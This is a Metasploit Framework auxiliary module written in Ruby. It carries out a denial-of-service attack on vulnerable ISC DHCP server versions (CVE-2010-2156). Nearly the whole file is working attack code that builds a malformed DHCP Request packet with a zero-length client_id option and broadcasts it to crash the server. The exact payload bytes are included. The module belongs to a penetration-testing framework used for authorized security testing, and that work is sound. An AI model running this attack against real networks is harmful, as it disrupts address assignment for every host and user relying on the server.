##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'racket'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Dos
	include Msf::Exploit::Capture

	def initialize
		super(
			'Name'          => 'ISC DHCP Zero Length ClientID Denial of Service Module',
			'Description'   => %q{ 
					This module performs a Denial of Service Attack against the ISC DHCP server, 
				versions 4.1 before 4.1.1-P1 and 4.0 before 4.0.2-P1. It sends out a DHCP Request 
				message with a 0-length client_id option for an IP address on the appropriate range
				for the dhcp server. When ISC DHCP Server tries to hash this value it exits 
				abnormally.
			},
			'Author'        =>
					[
						'sid', # Original POC
						'TheLightCosine <thelightcosine@gmail.com>' # msf module
					],
			'License'       => MSF_LICENSE,
			'Version'       => '$Revision$',
			'References'    =>
				[
					[ 'CVE', '2010-2156' ],
					[ 'OSVDB', '65246'],
					[ 'URL', 'http://www.exploit-db.com/exploits/14185/']
				]
		)
		register_options(
			[
				OptAddress.new('RIP', [true, 'A valid IP to request from the server'])
			]
		)
		deregister_options('RHOST','FILTER','PCAPFILE','SNAPLEN','TIMEOUT')
	end

	def run
		print_status("Creating DHCP Request with 0-length ClientID")
		open_pcap
		n = Racket::Racket.new

		n.layers[3] = Racket::L3::IPv4.new
		n.layers[3].dst_ip = '255.255.255.255'
		n.layers[3].version = 4
		n.layers[3].hlen = 0x05
		n.layers[3].ttl = 44
		n.layers[3].protocol = 0x11

		n.layers[4] = Racket::L4::UDP.new
		n.layers[4].src_port = 68
		n.layers[4].dst_port = 67

		n.layers[5] = Racket::L5::BOOTP.new
		n.layers[5].cip = datastore['RIP']
		n.layers[5].chaddr = "\xaa\xaa\xaa\xaa\xaa\xaa"
		n.layers[5].type = 1
		n.layers[5].payload = "\x63\x82\x53\x63\x35\x01\x03\x3d\x00\xff"

		n.layers[4].payload = n.layers[5]
		n.layers[4].fix!(n.layers[3].src_ip, n.layers[3].dst_ip)
		n.layers[4].payload = ""

		buff = n.pack
		print_status("Sending malformed DHCP request...")
		capture_sendto(buff, '255.255.255.255')
		close_pcap
	end
end
